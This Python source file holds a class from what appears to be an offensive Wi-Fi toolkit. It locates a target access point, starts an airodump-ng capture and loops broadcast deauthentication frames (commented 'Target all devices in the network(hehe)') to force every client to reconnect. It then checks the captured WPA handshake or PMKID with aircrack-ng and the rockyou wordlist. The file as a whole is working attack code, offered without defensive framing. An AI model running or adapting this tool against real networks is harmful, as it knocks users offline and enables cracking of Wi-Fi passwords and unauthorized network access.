import os
import time
import signal
import subprocess
import threading
import collections
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
from datetime import datetime
from modules.wifi_base import WifiBase

# Status namedtuple for handshake results
HandshakeStatus = collections.namedtuple(
    "HandshakeStatus", ["success", "reason", "has_beacon", "has_eapol", "aircrack_confirmed"]
)

class CaptureHandshake(WifiBase):
    def __init__(self, interface='wlan0', debug=False):
        super().__init__(interface, debug)
        self.capture_process = None
        self.capture_prefix = None
        self._deauth_thread = None
        self._deauth_stop_event = threading.Event()

    def find_bssid_channel(self, target_bssid, scan_time=12):
        # Scan for target BSSID and get its channel
        scan_prefix = "/tmp/prehandshake_scan"
        scan_cmd = f"airodump-ng --write {scan_prefix} --output-format csv {self.interface}"
        scan_proc = subprocess.Popen(
            scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid
        )
        time.sleep(scan_time)
        os.killpg(os.getpgid(scan_proc.pid), signal.SIGTERM)
        csv_file = f"{scan_prefix}-01.csv"
        channel = None
        if os.path.exists(csv_file):
            with open(csv_file) as f:
                for line in f:
                    if target_bssid.upper() in line.upper():
                        parts = line.split(",")
                        if len(parts) > 3:
                            channel = parts[3].strip()
                            break
            try:
                os.remove(csv_file)
            except Exception:
                pass
        if channel:
            self.log_message(f"BSSID {target_bssid} found on channel {channel}.")
        else:
            self.log_message(f"BSSID {target_bssid} not found in scan.", "error")
        return channel

    def capture_handshake(self, bssid, channel=None, deauth_packets=25, capture_duration=60, deauth_interval=5):
        # This will attempt to capture handshake
        if not channel:
            channel = self.find_bssid_channel(bssid)
            if not channel:
                self.log_message(f"BSSID {bssid} not found. Aborting handshake capture.", "error")
                return None
        if not self.set_interface_channel(channel):
            self.log_message("Failed to set interface channel.", "error")
            return None
        self.capture_prefix = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        capture_file = self.start_capture(bssid, channel)
        if not capture_file:
            self.log_message("Failed to start capture process.", "error")
            return None
        self._start_deauth_thread(bssid, deauth_packets, deauth_interval)
        self.log_message(f"Capturing for {capture_duration} seconds...")
        time.sleep(capture_duration)
        self.stop_capture()
        self._stop_deauth_thread()
        # Robust handshake verification!
        status = self._verify_handshake_smart(capture_file, bssid)
        if status.success:
            self.log_message("Successfully captured handshake!")
            return capture_file
        self.log_message(f"Failed to capture handshake: {status.reason}", 'warning')
        return None

    def set_interface_channel(self, channel):
        self.log_message(f"Setting interface to channel {channel}...")
        result = self.run_cmd(f"iwconfig {self.interface} channel {channel}")
        return result is not False

    def start_capture(self, bssid, channel):
        # Start packet capture using airodump-ng
        self.log_message(f"Starting capture on channel {channel} for BSSID {bssid}...")
        capture_cmd = (
            f"airodump-ng -c {channel} --bssid {bssid} "
            f"-w {self.capture_prefix} {self.interface} --output-format pcap"
        )
        try:
            self.capture_process = subprocess.Popen(
                capture_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            time.sleep(8)
            return f"{self.capture_prefix}-01.cap"
        except Exception as error:
            self.log_message(f"Failed to start capture: {str(error)}", 'error')
            return None

    def _send_deauth_packets(self, bssid, count):
        # Send deauthentication packets to force clients to reconnect
        self.log_message(f"Sending {count} deauthentication packets...")
        try:
            packet = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff", # Target all devices in the network(hehe)
                addr2=bssid,
                addr3=bssid
            ) / Dot11Deauth(reason=7)
            sendp(packet, iface=self.interface, count=count, inter=0.1, verbose=0)
        except Exception as error:
            self.log_message(f"Failed to send deauth packets: {str(error)}", 'error')

    def _deauth_loop(self, bssid, count, interval):
        while not self._deauth_stop_event.is_set():
            self._send_deauth_packets(bssid, count)
            if self._deauth_stop_event.wait(interval):
                break

    def _start_deauth_thread(self, bssid, count, interval):
        self._deauth_stop_event.clear()
        self._deauth_thread = threading.Thread(
            target=self._deauth_loop, args=(bssid, count, interval), daemon=True
        )
        self._deauth_thread.start()

    def _stop_deauth_thread(self):
        if self._deauth_thread and self._deauth_thread.is_alive():
            self._deauth_stop_event.set()
            self._deauth_thread.join()
        self._deauth_thread = None

    def stop_capture(self):
        # Stop capture process
        if hasattr(self, "capture_process") and self.capture_process:
            try:
                os.killpg(os.getpgid(self.capture_process.pid), signal.SIGTERM)
                self.log_message("Capture process terminated successfully.")
            except Exception as error:
                self.log_message(f"Failed to stop capture process: {str(error)}", 'error')
            finally:
                self.capture_process = None

    def _get_bssids_from_cap(self, cap_file):
        # Returns a set of all BSSIDs (as uppercase, colon-separated) found in beacon frames in the capture file.
        try:
            result = subprocess.run([
                "tshark", "-r", cap_file,
                "-Y", "wlan.fc.type_subtype == 8",
                "-T", "fields", "-e", "wlan.bssid"
            ], capture_output=True, text=True, timeout=10)
            bssids = set(line.strip().upper() for line in result.stdout.splitlines() if line.strip())
            return bssids
        except Exception as error:
            self.log_message(f"Error extracting BSSIDs: {error}", "error")
            return set()

    def _verify_handshake_with_aircrack(self, cap_file, bssid=None, wordlist=None):
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt"
        cmd = ["aircrack-ng", "-w", wordlist]
        if bssid:
            cmd += ["-b", bssid]
        cmd.append(cap_file)
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            output = result.stdout
            print(output)
            found = ("handshake" in output.lower()) or ("pmkid" in output.lower())
            return found
        except Exception as error:
            self.log_message(f"Aircrack-ng error: {error}", "error")
            return False

    def _verify_handshake_smart(self, cap_file, requested_bssid, wordlist=None):
        """
        Robust handshake/PMKID verification logic:
        - auto-detects BSSID, handles multi-AP files,
        - does not fail if beacons are missing.
        """
        if not os.path.exists(cap_file):
            self.log_message("Capture file not found.", "error")
            return HandshakeStatus(False, "Capture file missing", False, False, False)
        detected_bssids = self._get_bssids_from_cap(cap_file)
        target_bssid = None
        if requested_bssid.upper() in detected_bssids:
            target_bssid = requested_bssid
        elif len(detected_bssids) == 1:
            target_bssid = list(detected_bssids)[0]
            self.log_message(f"Requested BSSID {requested_bssid} not found, using detected {target_bssid}.")
        elif len(detected_bssids) > 1:
            self.log_message(f"Multiple BSSIDs detected. Using first: {list(detected_bssids)[0]}")
            target_bssid = list(detected_bssids)[0]
        else:
            self.log_message("No beacon frames found in capture. Trying handshake check without -b option.")
            found = self._verify_handshake_with_aircrack(cap_file, bssid=None, wordlist=wordlist)
            return HandshakeStatus(found, "No beacon, checked without BSSID", False, found, found)
        found = self._verify_handshake_with_aircrack(cap_file, bssid=target_bssid, wordlist=wordlist)
        if found:
            return HandshakeStatus(True, "Handshake or PMKID detected", True, True, True)
        else:
            return HandshakeStatus(False, "No handshake detected by aircrack-ng", True, True, False)